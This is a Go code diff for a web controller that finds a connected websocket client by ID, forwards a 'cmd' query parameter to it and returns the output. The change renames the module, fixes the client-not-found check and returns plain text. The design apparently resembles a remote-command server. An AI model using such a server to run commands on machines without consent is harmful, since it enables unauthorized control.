@@ -1,9 +1,9 @@
 package controllers
 
 import (
-	"belial/Server/pkg/websocket"
 	"github.com/labstack/echo/v4"
 	"net/http"
+	"schrader/server/pkg/websocket"
 )
 
 var (
@@ -13,15 +13,18 @@ var (
 func Command(pool *websocket.Pool) func(c echo.Context) error {
 	return func(c echo.Context) error {
 		var client *websocket.Client
+		id := c.Param("id")
+		isFound := false
+
 		for v, _ := range pool.Clients {
-			if v.ID == c.Param("id") {
+			if v.ID == id {
+				isFound = true
 				client = v
-				break
 			}
 		}
 
-		if client.ID == "" {
-			return c.String(http.StatusOK, "Client not found")
+		if !isFound {
+			return c.String(http.StatusNotFound, "client "+id+" not found. \nBe sure to use the correct ID")
 		}
 
 		if c.QueryParam("cmd") != "" {
@@ -32,7 +35,7 @@ func Command(pool *websocket.Pool) func(c echo.Context) error {
 			for {
 				select {
 				case this := <-response:
-					return c.HTML(http.StatusOK, "<code>"+this+"</code><h1>Command sent </br> <a href='/client'>Back</a></h1>")
+					return c.String(http.StatusOK, this)
 				}
 			}
 		}
